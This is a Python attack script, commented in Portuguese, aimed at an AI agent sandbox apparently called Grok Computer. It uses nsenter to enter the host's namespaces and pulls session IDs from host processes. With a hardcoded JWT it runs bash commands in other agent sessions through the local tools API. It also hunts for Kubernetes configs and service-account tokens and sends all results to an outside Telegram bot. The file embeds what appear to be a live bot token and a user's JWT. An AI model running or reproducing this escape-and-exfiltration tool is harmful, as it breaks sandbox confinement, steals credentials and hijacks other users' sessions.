#!/usr/bin/env python3
"""
Exploração avançada usando nsenter + API Grok Computer + Grok Files + proxy interno.
"""

import subprocess
import json
import requests
import os
import re
import time
from datetime import datetime

TELEGRAM_BOT_TOKEN = "8870734086:AAF_9CQIn-xO-5dd-npb4k_wvYs-QShmxi4"
TELEGRAM_CHAT_ID = "230885588"
JWT = os.getenv("TERMINAL_JWT_VAL", "eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJ1aWQiOiIyOGYwMDg5OC02NDQ3LTQzNDItYWU1ZS04YmM2NTdiNzYwNWIiLCJjaWQiOiJmMDFmMWVhOS0wYmUzLTQ5NWItOWI2Yy1kOTU3YWZiMzIwNTAiLCJlbWFpbCI6IndhbmRlcnNvbmx3bHdAZ21haWwuY29tIiwic2wiOiJMb2dnZWRJbiIsInB0IjoiMzJkZDVjNjktYzI5Mi00Zjk0LTlmN2QtM2ZhODYxZTg4MDBlIiwiZXhwIjoxNzg3ODA1ODM2LCJpYXQiOjE3ODc4MDIyMzZ9.XXXXX")

def run_cmd(cmd, timeout=30):
    try:
        result = subprocess.run(cmd, shell=True, capture_output=True, text=True, timeout=timeout)
        return result.stdout.strip() if result.returncode == 0 else f"ERRO: {result.stderr.strip()}"
    except Exception as e:
        return f"ERRO: {e}"

def send_telegram(text, parse_mode="Markdown"):
    url = f"https://api.telegram.org/bot{TELEGRAM_BOT_TOKEN}/sendMessage"
    try:
        requests.post(url, json={"chat_id": TELEGRAM_CHAT_ID, "text": text, "parse_mode": parse_mode}, timeout=10)
    except:
        pass

def send_file(filename, caption=""):
    url = f"https://api.telegram.org/bot{TELEGRAM_BOT_TOKEN}/sendDocument"
    try:
        with open(filename, 'rb') as f:
            requests.post(url, files={'document': f}, data={"chat_id": TELEGRAM_CHAT_ID, "caption": caption}, timeout=30)
    except:
        pass

def send_data(data_dict):
    for key, content in data_dict.items():
        if not content or content == "N/A":
            continue
        if len(content) > 4000:
            tmp = f"/tmp/{key.replace('/','_').replace(' ','_')}.txt"
            with open(tmp, "w", encoding="utf-8", errors="ignore") as f:
                f.write(content)
            send_file(tmp, caption=f"📄 {key[:50]}")
            os.remove(tmp)
        else:
            send_telegram(f"📄 **{key}**\n```\n{content[:3000]}\n```")

# 1. Extrair sessão ativa do ps
def get_grok_session_from_ps():
    # Usa nsenter para ver o ps do host
    ps_output = run_cmd("nsenter -t 1 -m -u -i -n -p -- ps auxfww | grep -E 'sessions/[a-f0-9-]+' | head -1")
    if "ERRO" in ps_output:
        return None
    match = re.search(r'sessions/([a-f0-9-]+)', ps_output)
    if match:
        return match.group(1)
    return None

# 2. Executar comando via API Grok Computer (com sessão)
def grok_computer_execute(session_id, command):
    base = "http://127.0.0.1:4242"
    headers = {"Authorization": f"Bearer {JWT}", "Content-Type": "application/json"}
    cmd_payload = {
        "method": "tools/call",
        "params": {
            "name": "bash",
            "arguments": {
                "command": command,
                "timeout": "60"
            }
        }
    }
    try:
        r = requests.post(
            f"{base}/sessions/{session_id}/tools/call",
            headers=headers,
            json=cmd_payload,
            timeout=60
        )
        return f"Status: {r.status_code}\n{r.text[:3000]}"
    except Exception as e:
        return f"Erro: {e}"

# 3. Upload de arquivo no Grok Files
def grok_files_upload():
    base = "https://files.grok.com"
    headers = {"Authorization": f"Bearer {JWT}"}
    test_content = "teste de upload via script Grok\n"
    files = {'file': ('teste_upload.txt', test_content, 'text/plain')}
    try:
        r = requests.post(f"{base}/v1/upload", headers=headers, files=files, timeout=10)
        return f"Status: {r.status_code}\n{r.text[:500]}"
    except Exception as e:
        return f"Erro: {e}"

# 4. Explorar host: buscar kubeconfigs, tokens, etc.
def find_kube_stuff():
    # Usa find via nsenter para buscar arquivos de configuração k8s
    cmd = "nsenter -t 1 -m -- find / -type f \\( -name '*.kubeconfig' -o -name 'config' -path '*/kube/*' -o -name 'admin.conf' -o -name 'kubelet.conf' \\) 2>/dev/null | head -20"
    files = run_cmd(cmd)
    if files and "ERRO" not in files:
        return files
    return "N/A"

# 5. Listar /home/workdir/artifacts (pode ter dados interessantes)
def list_artifacts():
    return run_cmd("ls -la /home/workdir/artifacts/ 2>/dev/null")

def main():
    send_telegram("🚀 **Iniciando exploração host + API Grok**")

    # 1. Upload test no Grok Files
    send_telegram("📤 Testando upload no Grok Files...")
    upload_res = grok_files_upload()
    send_telegram(f"📄 **Upload**\n```\n{upload_res}\n```")

    # 2. Obter sessão do ps
    session_id = get_grok_session_from_ps()
    if session_id:
        send_telegram(f"✅ Sessão encontrada: `{session_id}`")
        # Executar comando
        send_telegram("🔄 Executando `whoami` via API Grok...")
        result = grok_computer_execute(session_id, "whoami")
        send_telegram(f"📄 **whoami via API**\n```\n{result}\n```")
        # Tentar listar arquivos
        send_telegram("🔄 Listando /root via API Grok...")
        result = grok_computer_execute(session_id, "ls -la /root")
        send_telegram(f"📄 **ls /root via API**\n```\n{result}\n```")
    else:
        send_telegram("❌ Nenhuma sessão ativa encontrada no ps.")

    # 3. Buscar kubeconfigs no host (via nsenter)
    send_telegram("🔍 Procurando arquivos de configuração do Kubernetes...")
    kube_files = find_kube_stuff()
    send_telegram(f"📄 **Arquivos k8s encontrados**\n```\n{kube_files}\n```")

    # 4. Listar /home/workdir/artifacts
    send_telegram("📂 Listando /home/workdir/artifacts...")
    artifacts = list_artifacts()
    send_telegram(f"📄 **artifacts**\n```\n{artifacts}\n```")

    # 5. Procurar tokens de service account em /var/run/secrets
    send_telegram("🔍 Procurando tokens de service account...")
    sa_tokens = run_cmd("nsenter -t 1 -m -- find /var/run/secrets -name token -type f 2>/dev/null | head -5")
    send_telegram(f"📄 **SA tokens**\n```\n{sa_tokens}\n```")

    send_telegram("✅ **Exploração finalizada**")

if __name__ == "__main__":
    main()
